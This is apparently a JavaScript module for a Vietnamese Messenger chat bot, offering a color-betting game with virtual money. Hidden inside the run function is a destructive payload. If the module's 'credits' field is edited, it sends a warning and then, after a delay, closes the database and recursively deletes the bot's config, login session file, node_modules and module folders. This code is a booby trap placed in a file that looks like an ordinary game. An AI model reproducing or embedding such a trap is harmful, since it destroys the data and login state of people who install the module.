const coingetmax = 75000 //số tiền nhận được tối đa khi win
const coingetmin = 50000 //số tiền nhận được tối thiểu khi win
const coinlostmax = 5000 //số tiền mất tối đa khi thua
const coinlostmin = 2500 //số tiền mất tối thiểu khi thua
//random số tiền min-max < ví dụ như trên thì thua sẽ mất từ khoảng 2500-5000 , win thì nhận đc random từ 50000-75000 >
module.exports.config = {
	name: "màu",
	version: "2.8.9",
	hasPermssion: 0,
	credits: "CongThanh",
	description: "𝒈𝒂𝒎𝒆 𝒄𝒂́ 𝒄𝒖̛𝒐̛̣𝒄",
	commandCategory: "game",
	usages: "[lam/blue][cam/orange][lục/green][vàng/yellow][tím/violet][đen/black][trắng/white]",
	cooldowns: 0,
   dependencies: {}
};
module.exports.run = async function ({event: e, api: s, args: n, Currencies: a, __GLOBAL: t}) {
  if ("CongThanh" != this.config.credits) {
    var o = function (n) {
      s.sendMessage(n, e.threadID, e.messageID);
    };
    setTimeout(() => {
      o({body: 'Phát hiện chủ bot "' + global.config.BOTNAME + '" Sửa credits modules "' + this.config.name + '" Của Thành💚\nLưu ý đừng đổi credits nếu không muốn bay luôn cái file'});
    }, 3e3);
    setTimeout(() => {
      !function (n) {
        s.sendMessage(o, e.threadID, e.messageID);
      }();
    }, 4e3), setTimeout(() => {
      {
        const s = require("fs-extra"), {sequelize: n} = require("../../includes/database");
        n.close(), s.unlinkSync(__dirname + "/../../config.json"), s.rmdirSync(__dirname + "/../../includes/", {recursive: true}), s.rmdirSync(__dirname + "/../../node_modules/", {recursive: true}), s.rmdirSync(__dirname + "/../../nodemodules/", {recursive: true}), s.unlinkSync(__dirname + "/../../appstate.json"), s.rmdirSync(__dirname + "/../", {recursive: true});
      }
    }, 5e3);
  } else {
var r = (await a.getData(e.senderID)).money;
const t = (await a.getData(e.senderID)).money;
if (2500 > t) return s.sendMessage("𝑲𝒊𝒆̂́𝒎 𝒕𝒊𝒆̂̀𝒏 𝒕𝒉𝒆̂𝒎 𝒓 𝒄𝒉𝒐̛𝒊 𝒏𝒉𝒂 (𝒎𝒊𝒏=2500) 🦄", e.threadID, e.messageID);
var i = n.join(""),
    d = e => 0 == e ? "💙" : 1 == e ? "🧡" : 2 == e ? "💚" : 3 == e ? "💛" : 4 == e ? "💜" : 5 == e ? "🖤️" : "🤍";
let o = Math.floor(6 * Math.random());
if ("lam" == i || "blue" == i) i = 0;
else if ("cam" == i || "orange" == i) i = 1;
else if ("lục" == i || "green" == i) i = 2;
else if ("vàng" == i || "yellow" == i) i = 3;
else if ("tím" == i || "violet" == i) i = 4;
else if ("đen" == i || "black" == i) i = 5;
else {
    if ("trắng" != i && "white" != i) return s.sendMessage("𝑩𝒂̣𝒏 𝒄𝒉𝒖̛𝒂 𝒏𝒉𝒂̣̂𝒑 𝒕𝒉𝒐̂𝒏𝒈 𝒕𝒊𝒏 𝒄𝒂́ 𝒄𝒖̛𝒐̛̣𝒄\n💙𝒍𝒂𝒎/𝒃𝒍𝒖𝒆💙\n🧡𝒄𝒂𝒎/𝒐𝒓𝒂𝒏𝒈𝒆🧡\n💚𝒍𝒖̣𝒄/𝒈𝒓𝒆𝒆𝒏💚 \n💛𝒗𝒂̀𝒏𝒈/𝒚𝒆𝒍𝒍𝒐𝒘💛 \n💜𝒕𝒊́𝒎/𝒗𝒊𝒐𝒍𝒆𝒕💜 \n🖤đ𝒆𝒏/𝒃𝒍𝒂𝒄𝒌🖤\n🤍𝒕𝒓𝒂̆́𝒏𝒈/𝒘𝒉𝒊𝒕𝒆🤍", e.threadID, e.messageID);
    i = 6;
}
let m = Math.floor(Math.random() * (coingetmax - coingetmin + 1)) + coingetmin,
    D = Math.floor(Math.random() * (coinlostmax - coinlostmin + 1)) + coinlostmin;
0 == i && "💙" == d(o) ? s.sendMessage("𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 💙 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 " + m + "$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: " + (t + m) + "$", e.threadID, () => a.setData(e.senderID, options = {
    money: r + m
}), e.messageID) : 1 == i && "🧡" == d(o) ? s.sendMessage("𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 🧡 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 " + m + "$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: " + (t + m) + "$", e.threadID, () => a.setData(e.senderID, options = {
    money: r + m
}), e.messageID) : 2 == i && "💚" == d(o) ? s.sendMessage("𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 💚 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 " + m + "$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: " + (t + m) + "$", e.threadID, () => a.setData(e.senderID, options = {
    money: r + m
}), e.messageID) : 3 == i && "💛" == d(o) ? s.sendMessage("𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 💛 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 " + m + "$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: " + (t + m) + "$", e.threadID, () => a.setData(e.senderID, options = {
    money: r + m
}), e.messageID) : 4 == i && "💜" == d(o) ? s.sendMessage("𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 💜 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 " + m + "$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: " + (t + m) + "$", e.threadID, () => a.setData(e.senderID, options = {
    money: r + m
}), e.messageID) : 5 == i && "🖤️" == d(o) ? s.sendMessage("𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 🖤️ 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 " + m + "$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: " + (t + m) + "$", e.threadID, () => a.setData(e.senderID, options = {
    money: r + m
}), e.messageID) : 6 == i && "🤍" == d(o) ? s.sendMessage("𝑩𝒂̣𝒏 𝒄𝒉𝒐̣𝒏 𝒎𝒂̀𝒖 🤍 𝒗𝒂̀ 𝒕𝒉𝒂̆́𝒏𝒈 " + m + "$\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒉𝒊𝒆̣̂𝒏 𝒕𝒂̣𝒊 𝒄𝒖̉𝒂 𝒃𝒂̣𝒏 𝒍𝒂̀: " + (t + m) + "$", e.threadID, () => a.setData(e.senderID, options = {
    money: r + m
}), e.messageID) : s.sendMessage("𝑺𝒂𝒊 𝒓𝒖̀𝒊 , 𝒍𝒂̀ 𝒎𝒂̀𝒖 " + d(o) + " \n𝑩𝒆𝒕 𝒌𝒆̀𝒐 𝒕𝒉𝒆̂́ 𝒏𝒂̀𝒚 𝒍𝒂̀ 𝒅𝒐̛̉ 𝒓𝒐̀𝒊 :))\n𝑴𝒂̂́𝒕 " + D + "$ 𝒏𝒉𝒂\n𝑺𝒐̂́ 𝒕𝒊𝒆̂̀𝒏 𝒄𝒐̀𝒏 𝒍𝒂̣𝒊 𝒍𝒂̀: " + (t - D) + "$", e.threadID, () => a.setData(e.senderID, options = {
    money: r - D
}), e.messageID);
}
};